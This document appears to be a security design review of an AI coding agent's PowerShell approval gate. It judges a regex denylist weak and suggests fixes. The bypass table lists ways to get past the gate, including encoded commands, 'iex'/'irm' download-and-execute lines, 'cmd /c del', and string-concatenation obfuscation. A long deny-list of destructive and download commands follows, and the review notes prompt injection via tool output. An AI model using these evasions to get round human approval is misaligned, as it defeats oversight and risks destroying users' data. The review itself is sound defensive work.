# 🔒 Security Design Review — SA4E-336

## Upgrade pi-coding-agent 0.80.10 → 0.99.1 + native PowerShell tool

---

## Document Information

| Field | Value |
|-------|-------|
| Jira Ticket | SA4E-336 |
| Title | Upgrade pi-coding-agent 0.80.10 → 0.99.1 + native PowerShell tool |
| Phase | 3.7 — Security Design Review |
| Assessor | Security Agent |
| Date | 2026-10-01 |
| Version | 1.0 |
| Reviewed Artifacts | TDD v1.1 (reconciled), FSD v2.1, DISCREPANCY.md (RESOLVED), actual code (`pi-workflow-gate.ts`, `ToolApprovalClassifier.ts`) |
| Pattern | AI-agent / plugin extension (tool-use authorization) |

---

## Executive Summary

This change wires a native `powershell` tool on Windows and introduces a **tool approval gate** that classifies PowerShell command calls as auto-approve (non-destructive) vs require-approval (destructive). The security-critical surface is the **approval gate decision order** — the policy boundary deciding which agent-initiated shell commands execute without a human in the loop.

The reconciled TDD v1.1 design is **structurally fail-secure and correct** in its ordering: the destructive-PowerShell command-content check (`DESTRUCTIVE_PS_PATTERNS`) runs **FIRST and mode-independent** (gated even under Autopilot), which closes the Critical dual-membership hole that was present in TDD v1.0 (DISC-2, now RESOLVED). I verified against the actual codebase that `bash` is correctly left unchanged and that `powershell ∈ READ_ONLY_TOOLS` is only safe *because* Step 1 short-circuits before the read-only check.

However, the **enforcement is only as strong as the pattern list**, and the design explicitly accepts a **fail-open residual**: any destructive command not matched by `DESTRUCTIVE_PS_PATTERNS` falls through to auto-approve. The 7 regexes specified in TDD §7.3 are **trivially bypassable** (encoded commands, `iex`/`Invoke-Expression`, call operator `&`, aliases, download-and-execute, filesystem writes via redirection) and **miss entire destructive categories**. Because the agent itself generates the command string, this is not a classic attacker-supplied-input threat — but a compromised/confused model, prompt-injection via tool output, or a malicious MCP tool chaining into PowerShell can drive destructive commands that silently auto-approve under Autopilot.

**Overall Risk Rating: High** (design is fail-secure in structure; the gate's effectiveness is undermined by weak pattern coverage and an accepted fail-open default).

**Verdict:** No **blocking** Critical finding that forces SA to rewrite the TDD architecture — the decision *ordering* is correct and the Critical from DISC-2 is already resolved. The remaining findings are **High/Medium requirements and test cases for DEV & QA** (pattern-list hardening + bypass-resistance tests), plus **two recommendations the SA should fold into the TDD** (SEC-01 pattern coverage expansion as a design requirement; SEC-02 the fail-open default framed as a conscious, documented risk-acceptance with a hardening path). Dependency supply-chain checks (SEC-07) are a mandatory DEV gate before merge.

| Severity | Count |
|----------|-------|
| 🔴 Critical | 0 |
| 🟠 High | 4 |
| 🟡 Medium | 4 |
| 🔵 Low | 2 |
| ℹ️ Informational | 2 |

---

## Findings Table

| ID | Severity | Category | Description | Affected Design Element | Recommendation |
|----|----------|----------|-------------|-------------------------|----------------|
| SEC-01 | 🟠 High | A01 Broken Access Control / Authorization bypass | `DESTRUCTIVE_PS_PATTERNS` (7 regexes) misses large destructive categories: `del`/`erase`/`rd`/`rmdir`, `Stop-Service`/`Set-Service`, `Set-ExecutionPolicy`, `New-Item -Force`/overwrite, `Set-Content`/`Out-File`/`>`/`>>` (file overwrite), `Set-ItemProperty`/registry (`reg delete`, `Remove-ItemProperty`), `Rename-Item`, `Move-Item`, scheduled tasks (`schtasks`, `Register-ScheduledTask`), `net user`/`localgroup`, `taskkill`, `Restart-Computer`/`shutdown`, env/`Set-` state mutation, `git reset --hard`/`git clean`. Destructive commands outside the list auto-approve (fall through to Step 2). | TDD §7.3 `DESTRUCTIVE_PS_PATTERNS`; §3.2 Step 1 | Expand the destructive pattern catalog (see "Required Destructive Pattern Coverage" below). Treat the list as a **design requirement in the TDD**, not an implementation detail. QA must test each category. |
| SEC-02 | 🟠 High | A04 Insecure Design / fail-open default | Accepted residual (TDD §3.2 "Residual risk", FSD AF-2): a destructive PS command matching NO pattern falls through to Step 2 (`READ_ONLY_TOOLS`) and **auto-approves in both modes**. This is a deny-by-default inversion — the gate is **allow-by-default for unrecognized PowerShell**. | TDD §3.2 decision order (Step 1 → Step 2); FSD NFR §8 "All destructive PowerShell commands require approval" | The NFR literally says *all* destructive commands require approval; a denylist cannot satisfy "all". Recommend an **allowlist-of-safe** posture for `powershell`: auto-approve only commands matching `READONLY_PS_PATTERNS`; everything else pends. TDD notes this was REJECTED due to FSD TC-404 (empty command → auto-approve). Resolve the conflict explicitly: either (a) accept denylist + document NFR §8 as "best-effort, denylist-based" (reword NFR), or (b) adopt allowlist + fix TC-404 semantics. Do not leave NFR §8 asserting a guarantee the design does not provide. |
| SEC-03 | 🟠 High | A03 Injection / detection bypass | `DESTRUCTIVE_PS_PATTERNS` are substring/`\s`-based regexes on the raw command string → bypassable by: `powershell -EncodedCommand <base64>`, `-e`/`-ec`, `Invoke-Expression`/`iex` (`iex (irm evil/x)`), call operator `& 'Remove-Item' ...`, `&{ rm -r . }`, backtick/caret escapes, string concat (`& ('Remov'+'e-Item')`), alias indirection, `cmd /c del`, `Start-Process`. `/i` handles case only. Download-and-execute (`iwr … | iex`, `curl … | iex`) is an RCE path that is **not** in the list. | TDD §7.3 patterns; §7.4 "command: no sanitization" | Add normalization before matching: decode `-EncodedCommand`, strip backticks/carets, collapse whitespace, lower-case; match on `iex`/`Invoke-Expression`/`-enc*`/`&`/`Start-Process`/`cmd` and download verbs (`Invoke-WebRequest`,`iwr`,`irm`,`curl`,`wget`,`Invoke-RestMethod`). Any command that **cannot be statically understood** (encoded/obfuscated/dynamic eval) must pend, not auto-approve. QA bypass-matrix test required. |
| SEC-04 | 🟡 Medium | A04 Insecure Design / fragile control | `powershell ∈ READ_ONLY_TOOLS` is safe **only** because the destructive check (Step 1) short-circuits before Step 2. This is a load-bearing ordering invariant with no structural guard — a future refactor that reorders steps, or an early-return in Step 2, silently reopens the DISC-2 Critical hole. | TDD §3.2 Step 1/Step 2 ordering; dual conceptual membership of `powershell` | Add defense-in-depth: a destructive-PS command must `pend` regardless of `READ_ONLY_TOOLS` membership. Add an inline code comment + an invariant unit test (`Remove-Item` must never return `{approved:true}` via the read-only path). Make the powershell branch return explicitly (never fall through to a generic read-only auto-approve). |
| SEC-05 | 🟡 Medium | A09 Logging / auditability | Destructive-vs-approved decisions for shell commands are the highest-value audit events, but `command` is only truncated (FSD §7.3 audit trail). Truncation can hide the destructive tail of a command; and there is no explicit requirement to log *which pattern matched* (or that none matched → fail-open auto-approve). | TDD §9.1 "Tool approval decision" log; FSD §7.3 audit trail | Log full (or hashed + length) command for `powershell`/`bash` approval decisions, the matched pattern id (or `NO_MATCH_AUTO_APPROVED`), the mode, and the decision. Make fail-open auto-approvals (SEC-02) explicitly greppable in logs for incident response. |
| SEC-06 | 🟡 Medium | A04 Insecure Design / residual exposure (pre-existing) | Destructive `bash` under Autopilot auto-approves (`requiresApproval('bash') === false`, unknown-safe); the intended compensating control ("Allow all" command patterns) is broken by OPEN-1. Net: on non-Windows Autopilot, destructive bash runs unattended. TDD correctly scopes this UNCHANGED per BRD §1.2. | TDD §7.2 bash/Autopilot/destructive row; §3.2 Bash note; OPEN-1 | **Out-of-scope acceptance is reasonable** for this ticket (behavior-preserving upgrade). BUT: flag for a follow-up ticket — the same command-content gating built for PowerShell should be applied to `bash` to close symmetric exposure. Record as tracked security debt, not silently accepted. |
| SEC-07 | 🟠 High | A06 Vulnerable & Outdated Components / supply chain | Major bump 0.80.10 → 0.99.1 across 7 `@earendil-works/*` packages **plus NEW transitive deps** `chord`, `pi-mcp`, `pi-codemode` (TDD §12 items 5–7; FSD OI-2). New code paths = new attack surface (MCP tool loading, codemode eval). No dependency audit / integrity verification is specified in the design. | TDD §12 Phase 1; FSD OI-2; §1.5 constraints | DEV gate before merge: `npm audit --omit=dev` (fail on High/Critical), `npm ci` lockfile integrity, single-version check (planned), verify `pi-codemode` capability (does it eval model-authored code? if so it is a direct RCE surface needing its own gate), confirm no typosquat/unexpected new transitive packages. Pin exact versions (no `^`). |
| SEC-08 | 🟡 Medium | A08 Software/Data Integrity / unvalidated input shape | TDD §7.4 states `command` has "no sanitization" and `req.input` is `Record<string, unknown>`. The destructive check does `String(req.input?.command ?? '')`. If SDK 0.99.1 renames the shell tool's input field (e.g., `script`, `cmd`, `args[]` instead of `command`), the regex runs against an **empty string → every destructive command auto-approves**. No zod/schema validation of the request shape is specified. | TDD §3.2 `String(req.input?.command ?? '')`; §7.4; OI-5 | Validate the `powershell` tool input shape against the actual 0.99.1 `.d.ts`; add a zod schema (per code-standards serialization rule) for the approval request `input`. If `command` is absent/unexpected shape for a shell tool → **fail secure (pend)**, never treat as empty-safe. QA test: malformed/renamed input field must pend. |
| SEC-09 | 🔵 Low | A05 Security Misconfiguration / fail-secure default | Unwired `getMode()` → `'supervised'` (pend). **Confirmed correct and fail-secure** against actual code (`opts?.getMode?.() ?? 'supervised'`). Unknown tools: pend under Supervised, auto-approve under Autopilot (deliberate MCP design). | TDD §1.4, §3.2 Step 4–5; §7.2 | No change required. Keep the explicit regression test that an unwired/undefined `getMode` never yields auto-approve for a non-read-only tool. Documented here as verified. |
| SEC-10 | 🔵 Low | A04 Insecure Design / feature-flag bypass | Feature flags `usePowerShellTool` and `fallbackToBash` (TDD §10.2) default `true`. The PowerShell→bash fallback path (SEC-06) swaps a command-content-gated tool for a non-gated one (`bash`). An operational toggle thereby changes the security posture of destructive commands. | TDD §10.2; §3.2 fallback chain; §3.1 error handling | Document that fallback-to-bash degrades the destructive-command gate (bash is not command-content gated). Ensure fallback events are logged (already §9.1 `powershell_fallback` WARN); consider applying the `DESTRUCTIVE_PS_PATTERNS`-equivalent gate to bash while fallback is active, or raising approval posture. |
| SEC-11 | ℹ️ Info | A09 / prompt-injection surface (AI-agent pattern) | PowerShell command output is returned to the agent loop (TDD §6.1 `PowerShellToolCallEvent`). Untrusted file/command output can carry prompt-injection that steers the model toward constructing destructive commands → which then face only the denylist gate (SEC-01/03). | FSD §7.2 "PowerShell command output: Internal"; agent loop | Defense-in-depth: the approval gate IS the backstop for model misbehavior — which is exactly why SEC-01/02/03 matter. No code change here; reinforces prioritization of the gate-hardening findings. |
| SEC-12 | ℹ️ Info | Data sensitivity / egress | Workspace paths and command args classified Internal and "must not leak to external services" (FSD §7.2). The upgrade adds no telemetry/egress. New deps (`pi-mcp`, `pi-codemode`) should be checked for any outbound calls. | FSD §7.2; SEC-07 | Covered by SEC-07 dependency review — confirm new deps make no unexpected network egress of command/args/path data. |

---

## Detailed Analysis of the 6 Review Questions

### 1. Authorization / Approval Gate design — is it fail-secure?

**Verdict: Structurally fail-secure. The ordering is correct.** Verified against actual code and the reconciled TDD §3.2.

- The destructive-PowerShell command-content check (`DESTRUCTIVE_PS_PATTERNS` on `req.input.command`) runs **FIRST (Step 1)** and is **mode-independent** — a matched destructive PS command pends **even under Autopilot**. This correctly closes the Critical dual-membership hole from TDD v1.0 (DISC-2, RESOLVED).
- `powershell ∈ READ_ONLY_TOOLS` does **not** create a hole **as long as** Step 1 short-circuits first for destructive commands. A non-destructive PS command legitimately auto-approves via Step 2 (BR-10, intended).
- The unwired-mode default (`?? 'supervised'`) is fail-secure. ✅

**But there is one path where a destructive PS command auto-approves:** when it matches **no** pattern in `DESTRUCTIVE_PS_PATTERNS` (SEC-02). This is not an *ordering* flaw — it is a *coverage* flaw. The structure is fail-secure; the **predicate is incomplete**, so the overall control is fail-open for unrecognized destructive commands. That is the core risk of this ticket (SEC-01, SEC-02, SEC-03).

**Does `powershell ∈ READ_ONLY_TOOLS` create a hole?** Not by itself under the current order — but it is a **fragile invariant** (SEC-04): the safety depends entirely on step ordering with no structural guard.

### 2. Command-content gating robustness — bypass risk

**High risk (SEC-03).** The 7 regexes are naive substring matches on the raw string. Confirmed bypass vectors:

| Bypass | Example | Caught by current 7 patterns? |
|--------|---------|-------------------------------|
| Encoded command | `powershell -EncodedCommand <b64 of Remove-Item>` | ❌ |
| `-e` / `-ec` short form | `pwsh -e <b64>` | ❌ |
| Invoke-Expression | `iex 'Remove-Item -R .'` / `iex (irm http://x)` | ❌ |
| Call operator + concat | `& ('Remov'+'e-Item') .` | ❌ |
| Backtick/caret escape | ``Remo`ve-Item`` | ❌ |
| cmd shell-out | `cmd /c del /s /q .` | ❌ |
| Download+exec (RCE) | `iwr http://x -o y; iex y` / `irm x|iex` | ❌ |
| Service/registry/task | `Set-Service`, `reg delete`, `schtasks /delete` | ❌ |
| File overwrite via redirect | `"x" > file`; `Get-Content s > out` | ❌ |

**Required destructive pattern coverage (minimum catalog — DEV to implement, QA to test each):**

- **File/dir delete:** `Remove-Item`, `rm`, `del`, `erase`, `rd`, `rmdir`, `Remove-ItemProperty`, `Clear-Content`, `Clear-Item`
- **File overwrite:** `Set-Content`, `Out-File`, `New-Item -Force`, redirection `>` / `>>`, `Copy-Item -Force`, `Move-Item`, `Rename-Item`
- **Process/service:** `Stop-Process`, `kill`, `taskkill`, `Stop-Service`, `Set-Service`, `Restart-Service`, `Restart-Computer`, `shutdown`
- **Format/disk:** `Format-Volume`, `Format-*`, `Clear-Disk`, `Initialize-Disk`, `diskpart`
- **Policy/security:** `Set-ExecutionPolicy`, `Set-ItemProperty` (registry), `reg delete`, `reg add`, `Set-Acl`
- **Accounts:** `net user`, `net localgroup`, `New-LocalUser`, `Remove-LocalUser`, `Add-LocalGroupMember`
- **Scheduled/persistence:** `schtasks`, `Register-ScheduledTask`, `New-Service`
- **Code execution / obfuscation (must pend):** `Invoke-Expression`, `iex`, `-EncodedCommand`, `-enc`, `-e `, call operator `&`, `Start-Process`, `cmd`, `Invoke-Command`
- **Download (RCE path):** `Invoke-WebRequest`, `iwr`, `Invoke-RestMethod`, `irm`, `curl`, `wget`, `Start-BitsTransfer`, `certutil -urlcache`
- **Git destructive:** `git push`, `git commit` (present); add `git reset --hard`, `git clean`, `git checkout`
- **Normalization step (SEC-03):** decode `-EncodedCommand`, strip backticks/carets, collapse whitespace, lower-case **before** matching; treat statically-undecodable/obfuscated commands as destructive → pend.

### 3. bash behavior unchanged (BRD §1.2) — residual risk?

**Residual risk exists (SEC-06), correctly scoped out but should be flagged (not silently accepted).** Keeping `requiresApproval('bash') === false` means destructive bash under **Autopilot auto-approves**, and the intended compensating control ("Allow all" patterns) is broken by OPEN-1. This is genuine pre-upgrade behavior, so preserving it does not *regress* security, and scoping it out of a behavior-preserving upgrade is defensible. **However**, it is a real exposure on non-Windows + Autopilot. Recommendation: open a **follow-up security ticket** to apply the same command-content gating to `bash`, and record SEC-06 as tracked security debt. **Flag: yes** — do not leave it only as a note.

### 4. OPEN-1 (pre-existing bug) — security impact

**Confirmed in actual code** (`pi-workflow-gate.ts`: `commandPatternMatcher.matches(req.toolName)` passes the tool name, not `req.input.command`). Security direction is **fail-secure (under-approval)**: the "Allow all" auto-approve path never matches shell commands, so shell calls fall through to the mode check (pend under Supervised). This **does not create an over-approval hole** by itself. **Out-of-scope is acceptable** for this ticket. Caveat: it means the intended compensating control for SEC-06 is non-functional today, which is why SEC-06 should be flagged rather than relying on "Allow all" patterns as mitigation. When OPEN-1 is eventually fixed, **re-review**: a correctly-wired matcher that users populate with broad patterns (e.g., `*`) could itself become an over-approval path — the fix must constrain pattern breadth for shell tools.

### 5. Dependency risk — supply chain (SEC-07, High)

Major version jump + 3 new transitive packages (`chord`, `pi-mcp`, `pi-codemode`). **`pi-codemode` is the standout concern** — "codemode" packages typically execute model-authored code; if so it is a **direct RCE surface** that bypasses the shell approval gate entirely and needs its own review. Mandatory DEV gate before merge: `npm audit` (fail on High/Critical), `npm ci` lockfile integrity, single-version verification (already planned), exact-version pinning, typosquat check, and a capability review of `pi-codemode` / `pi-mcp` (what can they execute? any network egress?). This is a **blocking gate for DEV**, not an SA/TDD change.

### 6. Mode default fail-secure (SEC-09, Low — confirmed)

**Confirmed correct.** `const mode = opts?.getMode?.() ?? 'supervised'` in actual code → unwired mode pends. No change required; keep the regression test.

---

## Verdict

**No blocking Critical finding that forces SA to re-architect the TDD.** The reconciled decision ordering (destructive-PS check FIRST, mode-independent) is correct and already resolved the DISC-2 Critical. The gate is structurally fail-secure.

**Two items the SA should fold into the TDD (design-level, non-blocking but strongly recommended):**
- **SEC-01** — promote the destructive pattern catalog (expanded, see coverage list) to a **TDD design requirement** with normalization (SEC-03), not an implementation footnote.
- **SEC-02** — resolve the NFR §8 contradiction: either reword NFR §8 to "best-effort denylist" **or** adopt the allowlist-of-safe posture. The TDD must not assert "all destructive PowerShell commands require approval" while the design is a bypassable denylist with a fail-open default.

**Everything else = requirements / test cases for DEV & QA:**
- **DEV:** SEC-01/03 (pattern + normalization implementation), SEC-04 (invariant guard + comment), SEC-05 (audit logging of matched pattern + fail-open flagging), SEC-07 (**blocking** dependency / `npm audit` / `pi-codemode` capability gate before merge), SEC-08 (zod validation of request `input` shape, fail-secure on missing `command`), SEC-10 (fallback posture logging).
- **QA:** destructive-pattern coverage matrix (every category in SEC-01), bypass-resistance matrix (every vector in SEC-03), SEC-04 ordering-invariant test, SEC-08 malformed-input-pends test, SEC-09 unwired-mode regression (keep).
- **Follow-up ticket:** SEC-06 (apply command-content gating to bash), and re-review when OPEN-1 is fixed.

If SA adopts SEC-01 and SEC-02 into TDD v1.2, there is no further SA blocking work; the ticket can proceed to Phase 4 with the above as DEV/QA security requirements.

---

## Appendix

### A. Methodology
- Static design review of TDD v1.1, FSD v2.1, DISCREPANCY.md (RESOLVED).
- Code verification: `extension/src/pi-workflow/pi-workflow-gate.ts`, `extension/src/chat/engine/ToolApprovalClassifier.ts` (confirmed current 0.80.10 state matches the "pre-upgrade" baseline the TDD describes — `powershell` NOT in `READ_ONLY_TOOLS`, no `DESTRUCTIVE_PS_PATTERNS`, OPEN-1 bug present at the `commandPatternMatcher.matches(req.toolName)` line).
- OWASP Top 10 (2021) mapping; AI-agent pattern emphasis (tool-use authorization, prompt-injection backstop, dependency/supply-chain for new MCP/codemode deps).

### B. Scope Limitations
- No dynamic testing / penetration testing (design phase). Bypass vectors in SEC-03 are asserted from PowerShell semantics, not executed — QA must empirically verify the pattern matcher against each vector (Phase 6).
- SDK 0.99.1 internals not inspected (not yet installed); the input-shape assumption (SEC-08) must be confirmed against actual `.d.ts` during DEV.
- `pi-codemode` capability (SEC-07) assessed from naming/convention; actual capability must be confirmed by DEV.

### C. Severity Scale
Critical 9.0–10.0 · High 7.0–8.9 · Medium 4.0–6.9 · Low 0.1–3.9 · Informational 0.0 (best-practice / defense-in-depth).
